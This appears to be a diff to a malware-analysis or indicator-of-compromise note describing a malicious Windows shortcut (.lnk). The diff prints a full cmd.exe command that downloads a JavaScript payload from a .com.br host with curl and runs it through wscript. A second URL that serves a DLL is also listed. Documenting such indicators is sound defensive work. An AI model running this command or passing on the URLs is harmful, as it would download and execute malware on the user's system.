@@ -11,10 +11,7 @@
 
 lnk content
 
-cmd /c C:\Users\Admin\AppData\Local\Temp\maindata\Stata656.lnk
-
-"C:\Windows\System32\cmd.exe" /q /c echo 't5' && MD "C:\Users\Admin\AppData\Roaming\AF\yq9" && curl.exe --output C:\Users\Admin\AppData\Roaming\AF\yq9\MXoye8l.z2Xb.i8.js https://varejaocajuru.com.br/kUy/05.html && cd "C:\Users\Admin\AppData\Roaming\AF\yq9" && wscript MXoye8l.z2Xb.i8.js && echo "Vj"
-
+C:\Windows\System32\cmd.exe /q /c echo 't5' && MD "%APPDATA%\AF\yq9" && curl.exe --output %APPDATA%\AF\yq9\MXoye8l.z2Xb.i8.js https://varejaocajuru.com.br/kUy/05.html && cd "%APPDATA%\AF\yq9" && wscript MXoye8l.z2Xb.i8.js && echo "Vj"
 
 https://varejaocajuru.com.br/kUy/05.html .js
 https://prohabili.com.br/n3R/05.html .dll
